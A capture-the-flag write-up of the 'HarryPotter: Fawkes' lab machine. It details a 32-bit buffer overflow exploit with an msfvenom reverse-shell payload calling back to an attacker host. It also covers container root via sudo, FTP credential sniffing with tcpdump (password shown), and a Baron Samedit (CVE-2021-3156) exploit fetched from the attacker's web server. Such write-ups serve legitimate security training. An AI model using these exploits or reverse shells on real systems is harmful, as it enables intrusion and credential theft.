# HarryPotter: Fawkes — Writeup

**Series:** HarryPotter (Box 3 of 3)
**Difficulty:** Hard
**Author:** Mansoor R (@time4ster)
**Goal:** Find the last 3 horcruxes and defeat Voldemort

---

## Phase 1 — Enumeration

### Initial Nmap Scan

An initial nmap scan was run to discover the target IP and identify open ports.

![Initial nmap scan results](fawkes_screenshots/01_nmap_initial.png)

The following ports were found open:

- **21** — FTP (anonymous login allowed)
- **80** — HTTP
- **2222** — EtherNetIP-1
- **9898** — MonkeyCom

The target IP was saved to a variable to avoid retyping it throughout the engagement:

```bash
export ip=192.168.56.104
```

### Service and Version Scan

A targeted scan was run against the discovered ports to enumerate services and versions.

![Service version scan results](fawkes_screenshots/02_nmap_services.png)

Several interesting findings:

- **Two SSH ports** are open — port 22 on the host and port 2222 on what appears to be a separate service, suggesting a Docker container may be running inside the host.
- **Port 9898** (MonkeyCom) appears to be a program that takes user input, which warrants further investigation.

---

## Phase 2 — Probing Port 9898

Netcat was used to interact directly with the service on port 9898.

```bash
nc $ip 9898
```

![Netcat connection to port 9898](fawkes_screenshots/03_netcat_9898.png)

As suspected, the service accepts user input. This raises the possibility of a buffer overflow vulnerability, which will be investigated after further enumeration.

---

## Phase 3 — FTP Anonymous Login

The initial nmap scan revealed that FTP allows anonymous login. This was investigated immediately.

```bash
ftp $ip
# username: anonymous
# password: (blank)
```

![FTP anonymous login](fawkes_screenshots/04_ftp_login.png)

Login was successful. The directory contained a single file, `server_hogwarts`, which was downloaded.

```bash
get server_hogwarts
```

---

## Phase 4 — Binary Analysis

### Identifying the File

The downloaded file was analysed to determine what it is.

```bash
file server_hogwarts
```

![file command output](fawkes_screenshots/05_file_command.png)

It is a 32-bit Linux ELF executable.

### Extracting Strings

All human-readable strings embedded in the binary were dumped.

```bash
strings server_hogwarts
```

![strings output](fawkes_screenshots/06_strings_output.png)

`strcpy` was identified in the output. This confirms the possibility of a buffer overflow attack — `strcpy` copies user input into a buffer without checking the size, meaning oversized input can overwrite adjacent memory.

### Running the Binary

The binary was made executable and run locally.

```bash
chmod +x server_hogwarts
./server_hogwarts
```

It began listening on port 9898 — confirming it is the same application running on the target. This means the exploit can be developed and tested locally before being used against the target.

---

## Phase 5 — Buffer Overflow Exploitation

### Step 1 — Confirming the Vulnerability

A large input was sent to the running binary to test for a crash.

![Buffer overflow crash confirmation](fawkes_screenshots/07_bof_crash.png)

A segmentation fault was observed, confirming the buffer overflow vulnerability.

### Step 2 — Finding the Offset

Metasploit's pattern tool was used alongside GDB to determine the exact number of bytes needed to reach EIP.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

The generated pattern was sent to the binary running under GDB. The resulting EIP value was passed to `pattern_offset`:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764
```

![GDB crash showing EIP value](fawkes_screenshots/08_gdb_eip.png)

**Offset: 112 bytes**

### Step 3 — Confirming EIP Control

112 A's followed by 4 B's were sent to confirm control of EIP.

```bash
python3 -c "print('A' * 112 + 'BBBB')" | nc 127.0.0.1 9898
```

![EIP showing 0x42424242](fawkes_screenshots/09_eip_control.png)

GDB reported EIP as `0x42424242` (the hex value of `BBBB`), confirming full control of the instruction pointer.

### Step 4 — Finding a JMP ESP Gadget

A JMP ESP gadget was located inside the binary using `objdump`.

```bash
objdump -d server_hogwarts | grep -i "jmp.*esp"
```

![JMP ESP gadget address](fawkes_screenshots/10_jmp_esp.png)

The gadget was found at address **0x8049d55** (`ff e4` is the machine code for `JMP ESP`). In little-endian byte order this becomes `\x55\x9d\x04\x08`.

### Step 5 — Generating the Shellcode

A reverse shell payload was generated with msfvenom, excluding null bytes which would terminate the string copy prematurely.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -b "\x00" -f python
```

![msfvenom shellcode generation](fawkes_screenshots/11_msfvenom.png)

### Step 6 — Building and Firing the Exploit

The final exploit was assembled and fired against the target after several iterations of testing.

```python
import socket

jmp_esp = b"\x55\x9d\x04\x08"
nop_sled = b"\x90" * 32
buf =  b""
# (shellcode bytes)

payload = b"A" * 112 + jmp_esp + nop_sled + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.104", 9898))
s.send(payload)
s.close()
```

A netcat listener was set up before firing:

```bash
nc -lvnp 4444
```

![Reverse shell received](fawkes_screenshots/12_shell_received.png)

A shell was received. `id` and `whoami` confirmed the session was running as `harry`.

---

## Phase 6 — Docker Container Enumeration

The hostname and OS version were checked to confirm the environment.

```bash
hostname
cat /etc/os-release
```

![Docker container confirmation](fawkes_screenshots/13_docker_container.png)

The random hex hostname and Alpine Linux OS confirmed that this shell is inside a Docker container, not the host OS.

---

## Phase 7 — Escaping the Container

### Retrieving Credentials

Harry's home directory contained a `.mycreds.txt` file with credentials.

```bash
cat ~/.mycreds.txt
```

![mycreds.txt contents](fawkes_screenshots/14_mycreds.png)

### SSH into the Container

The credentials were used to SSH into the container's SSH service on port 2222.

```bash
ssh harry@192.168.56.104 -p 2222
```

### Escalating to Root Inside the Container

`sudo -l` revealed that harry can run all commands as root with no password.

```bash
sudo -l
```

Since Alpine Linux does not have bash, `ash` was used instead:

```bash
sudo /bin/ash
```

![Root shell inside container](fawkes_screenshots/15_container_root.png)

Root access was obtained inside the container.

### Horcrux 1

```bash
cat /root/horcrux1.txt
```

**horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}**

### Note

`note.txt` hinted at analysing network traffic to find a user attempting to log into the FTP server.

---

## Phase 8 — Network Traffic Analysis

The available network interfaces were checked.

```bash
ip a
```

The container is on `172.17.0.2`, meaning the host is at `172.17.0.1`. `tcpdump` was used to sniff FTP traffic on `eth0`.

```bash
tcpdump -i eth0 port 21 -A
```

![tcpdump FTP credentials](fawkes_screenshots/16_tcpdump_creds.png)

The capture revealed plaintext FTP credentials being sent repeatedly from the host:

- **User:** `neville`
- **Password:** `bL!Bsg3k`

> FTP transmits credentials in plaintext, making them trivially readable via traffic capture.

---

## Phase 9 — Host Access as Neville

The captured credentials were used to SSH into the real host on port 22.

```bash
ssh neville@192.168.56.104 -p 22
```

![SSH login as neville](fawkes_screenshots/17_neville_ssh.png)

### Horcrux 2

The second horcrux was found in neville's home directory.

```bash
cat /home/neville/horcrux2.txt
```

**horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}**

---

## Phase 10 — Privilege Escalation (Baron Samedit CVE-2021-3156)

### Confirming Vulnerability

The sudo version was checked.

```bash
sudo --version
```

**Sudo version 1.8.27** — confirmed vulnerable to Baron Samedit (CVE-2021-3156), which affects all versions below 1.9.5p2. It is a Python script that triggers a heap overflow in sudo to spawn a root shell without requiring a password.

### Transferring the Exploit

Since the target had no internet access, the exploit was downloaded on Kali and served via a Python web server.

On Kali:

```bash
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
python3 -m http.server 8080
```

On Fawkes:

```bash
wget http://192.168.56.101:8080/exploit_nss.py
```

### Running the Exploit

The sudo path was corrected in the script to match the target system (`/usr/local/bin/sudo`), then the exploit was run.

```bash
python3 exploit_nss.py
```

![Baron Samedit root shell](fawkes_screenshots/18_root_shell.png)

Root access was obtained on the host.

### Horcrux 3

```bash
cat /root/horcrux3.txt
```

**horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}**

---

## Summary

| Step | Technique |
|------|-----------|
| Enumeration | nmap, FTP anonymous login |
| Binary analysis | `file`, `strings` |
| Initial foothold | 32-bit Linux buffer overflow → reverse shell |
| Container escalation | sudo ash → root in Alpine Docker container |
| Lateral movement | tcpdump FTP credential sniffing → neville |
| Host escalation | Baron Samedit (CVE-2021-3156) → root |

### Horcruxes Found

| # | Horcrux |
|---|---------|
| 6 | `horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=}` |
| 7 | `horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}` |
| 8 | `horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}` |
